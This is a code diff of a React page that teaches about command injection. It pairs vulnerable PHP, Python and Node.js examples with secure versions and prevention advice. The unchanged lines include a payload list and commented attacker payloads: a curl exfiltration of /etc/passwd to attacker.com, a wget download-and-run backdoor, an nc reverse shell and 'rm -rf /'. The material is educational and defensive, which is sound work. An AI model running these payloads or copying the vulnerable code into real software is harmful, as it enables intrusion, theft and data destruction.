@@ -1,4 +1,3 @@
-
 import React from 'react';
 import { Terminal } from 'lucide-react';
 import CodeExample from '@/components/CodeExample';
@@ -6,10 +5,8 @@ import SecurityCard from '@/components/SecurityCard';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 import { InfoIcon, Shield } from 'lucide-react';
-
 const CommandInjection: React.FC = () => {
-  return (
-    <section id="cmd-injection" className="scroll-mt-20">
+  return <section id="cmd-injection" className="scroll-mt-20">
       <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Command Injection</h3>
       
       <div className="space-y-6">
@@ -37,26 +34,10 @@ const CommandInjection: React.FC = () => {
         <div>
           <h4 className="text-xl font-semibold mb-4">Common Command Injection Attack Vectors</h4>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-            <SecurityCard
-              title="OS Command Execution"
-              description="Direct execution of shell commands through functions like system(), exec(), or shell_exec() with user-controlled input parameters."
-              severity="high"
-            />
-            <SecurityCard
-              title="Path Traversal + Command"
-              description="Combining directory traversal with command injection to access and execute commands in different parts of the filesystem."
-              severity="high"
-            />
-            <SecurityCard
-              title="Blind Command Injection"
-              description="Command injection where the output is not directly visible, requiring time delays or out-of-band techniques to confirm execution."
-              severity="medium"
-            />
-            <SecurityCard
-              title="Filter Bypass Techniques"
-              description="Using encoding, alternative command separators, or shell features to bypass weak input validation and blacklist filters."
-              severity="medium"
-            />
+            <SecurityCard title="OS Command Execution" description="Direct execution of shell commands through functions like system(), exec(), or shell_exec() with user-controlled input parameters." severity="high" />
+            <SecurityCard title="Path Traversal + Command" description="Combining directory traversal with command injection to access and execute commands in different parts of the filesystem." severity="high" />
+            <SecurityCard title="Blind Command Injection" description="Command injection where the output is not directly visible, requiring time delays or out-of-band techniques to confirm execution." severity="medium" />
+            <SecurityCard title="Filter Bypass Techniques" description="Using encoding, alternative command separators, or shell features to bypass weak input validation and blacklist filters." severity="medium" />
           </div>
         </div>
 
@@ -191,11 +172,7 @@ const CommandInjection: React.FC = () => {
         {/* Common Payloads */}
         <div>
           <h4 className="text-xl font-semibold mb-4">Command Injection Payloads</h4>
-          <CodeExample 
-            language="bash" 
-            isVulnerable={true}
-            title="Basic Command Injection Payloads" 
-            code={`# Command separators - execute additional commands
+          <CodeExample language="bash" isVulnerable={true} title="Basic Command Injection Payloads" code={`# Command separators - execute additional commands
 ; whoami
 && whoami
 || whoami
@@ -233,18 +210,13 @@ $(whoami)
 # Output redirection and file operations
 ; echo "backdoor" > /tmp/test.txt
 && cat /etc/passwd > /tmp/passwd.txt
-|| ls -la / >> /tmp/files.txt`} 
-          />
+|| ls -la / >> /tmp/files.txt`} />
         </div>
 
         {/* Vulnerable Code Examples */}
         <div>
           <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
-          <CodeExample 
-            language="php" 
-            isVulnerable={true}
-            title="Vulnerable PHP Command Injection" 
-            code={`<?php
+          <CodeExample language="php" isVulnerable={true} title="Vulnerable PHP Command Injection" code={`<?php
 // VULNERABLE: Direct user input in shell commands
 function pingHost($host) {
     // User input directly concatenated into command
@@ -286,14 +258,9 @@ function viewLogFile($logfile) {
 
 // Attacker payload: "../../../etc/passwd; whoami #"
 // Resulting command: tail -n 100 /var/log/../../../etc/passwd; whoami #
-?>`} 
-          />
+?>`} />
           
-          <CodeExample 
-            language="python" 
-            isVulnerable={true}
-            title="Vulnerable Python Command Injection" 
-            code={`import subprocess
+          <CodeExample language="python" isVulnerable={true} title="Vulnerable Python Command Injection" code={`import subprocess
 import os
 from flask import Flask, request
 
@@ -341,14 +308,9 @@ def compress_files():
 # Attacker payloads:
 # host: "127.0.0.1; curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)"
 # domain: "google.com && wget http://attacker.com/malware.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh"
-# filename: "file.txt; rm -rf / #"`} 
-          />
+# filename: "file.txt; rm -rf / #"`} />
           
-          <CodeExample 
-            language="javascript" 
-            isVulnerable={true}
-            title="Vulnerable Node.js Command Injection" 
-            code={`const express = require('express');
+          <CodeExample language="javascript" isVulnerable={true} title="Vulnerable Node.js Command Injection" code={`const express = require('express');
 const { exec } = require('child_process');
 const app = express();
 
@@ -428,19 +390,14 @@ app.get('/system-info', (req, res) => {
 // Attacker payloads:
 // host: "127.0.0.1; nc attacker.com 4444 -e /bin/bash"
 // filename: "test.txt; curl http://attacker.com/exfil -d @/etc/passwd"
-// type=custom&command=whoami; cat /etc/shadow`} 
-          />
+// type=custom&command=whoami; cat /etc/shadow`} />
         </div>
 
         {/* Secure Code Examples */}
         <div>
           <h4 className="text-xl font-semibold mb-4">Secure Code Examples</h4>
           
-          <CodeExample 
-            language="php" 
-            isVulnerable={false}
-            title="Secure PHP Implementation" 
-            code={`<?php
+          <CodeExample language="php" isVulnerable={false} title="Secure PHP Implementation" code={`<?php
 // SECURE: Proper input validation and parameterized execution
 function pingHostSecure($host) {
     // 1. Input validation - only allow valid IP addresses and hostnames
@@ -514,14 +471,9 @@ function viewLogFileSecure($logfile) {
     // 4. Use file operations instead of shell commands when possible
     return file_get_contents($logPath, false, null, -1000); // Last 1000 chars
 }
-?>`} 
-          />
+?>`} />
 
-          <CodeExample 
-            language="python" 
-            isVulnerable={false}
-            title="Secure Python Implementation" 
-            code={`import subprocess
+          <CodeExample language="python" isVulnerable={false} title="Secure Python Implementation" code={`import subprocess
 import ipaddress
 import re
 import shlex
@@ -622,14 +574,9 @@ def system_info_secure():
         )
         return f"<pre>{result.stdout}</pre>"
     except Exception:
-        return "Command failed", 500`} 
-          />
+        return "Command failed", 500`} />
 
-          <CodeExample 
-            language="javascript" 
-            isVulnerable={false}
-            title="Secure Node.js Implementation" 
-            code={`const express = require('express');
+          <CodeExample language="javascript" isVulnerable={false} title="Secure Node.js Implementation" code={`const express = require('express');
 const { spawn, execFile } = require('child_process');
 const { promisify } = require('util');
 const path = require('path');
@@ -761,8 +708,7 @@ const validateInput = (req, res, next) => {
     next();
 };
 
-app.use(validateInput);`} 
-          />
+app.use(validateInput);`} />
         </div>
 
         {/* Prevention Strategies */}
@@ -779,7 +725,7 @@ app.use(validateInput);`}
           </Alert>
 
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-            <div className="p-4 bg-green-50 dark:bg-green-900/20 rounded-md border border-green-200 dark:border-green-800">
+            <div className="p-4 rounded-md border border-green-200 dark:border-green-800 bg-cybr-muted">
               <h5 className="font-semibold mb-3 text-green-800 dark:text-green-200">Primary Controls</h5>
               <ul className="list-disc pl-6 space-y-2 text-sm">
                 <li><strong>Avoid Shell Execution:</strong> Use language-specific libraries instead of shell commands</li>
@@ -790,7 +736,7 @@ app.use(validateInput);`}
               </ul>
             </div>
             
-            <div className="p-4 bg-blue-50 dark:bg-blue-900/20 rounded-md border border-blue-200 dark:border-blue-800">
+            <div className="p-4 rounded-md border border-blue-200 dark:border-blue-800 bg-cybr-muted">
               <h5 className="font-semibold mb-3 text-blue-800 dark:text-blue-200">Secondary Controls</h5>
               <ul className="list-disc pl-6 space-y-2 text-sm">
                 <li><strong>Sandboxing:</strong> Isolate command execution in restricted environments</li>
@@ -802,11 +748,7 @@ app.use(validateInput);`}
             </div>
           </div>
 
-          <CodeExample 
-            language="javascript" 
-            isVulnerable={false}
-            title="Secure Development Guidelines" 
-            code={`// 1. PREFERRED: Use native language features instead of shell commands
+          <CodeExample language="javascript" isVulnerable={false} title="Secure Development Guidelines" code={`// 1. PREFERRED: Use native language features instead of shell commands
 const fs = require('fs').promises;
 const path = require('path');
 
@@ -859,34 +801,19 @@ app.use((req, res, next) => {
     res.setHeader('X-Frame-Options', 'DENY');
     res.setHeader('X-XSS-Protection', '1; mode=block');
     next();
-});`} 
-          />
+});`} />
         </div>
 
         {/* Testing Tools */}
         <div>
           <h4 className="text-xl font-semibold mb-4">Testing Tools and Techniques</h4>
           <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
-            <SecurityCard
-              title="Manual Testing"
-              description="Manual payload injection using browser dev tools, Burp Suite, or OWASP ZAP for comprehensive testing."
-              severity="medium"
-            />
-            <SecurityCard
-              title="Automated Scanners"
-              description="Tools like Nikto, SQLmap, and custom scripts for automated command injection detection."
-              severity="medium"
-            />
-            <SecurityCard
-              title="Code Analysis"
-              description="Static analysis tools (SonarQube, Checkmarx) and code review to identify vulnerable patterns."
-              severity="low"
-            />
+            <SecurityCard title="Manual Testing" description="Manual payload injection using browser dev tools, Burp Suite, or OWASP ZAP for comprehensive testing." severity="medium" />
+            <SecurityCard title="Automated Scanners" description="Tools like Nikto, SQLmap, and custom scripts for automated command injection detection." severity="medium" />
+            <SecurityCard title="Code Analysis" description="Static analysis tools (SonarQube, Checkmarx) and code review to identify vulnerable patterns." severity="low" />
           </div>
         </div>
       </div>
-    </section>
-  );
+    </section>;
 };
-
 export default CommandInjection;
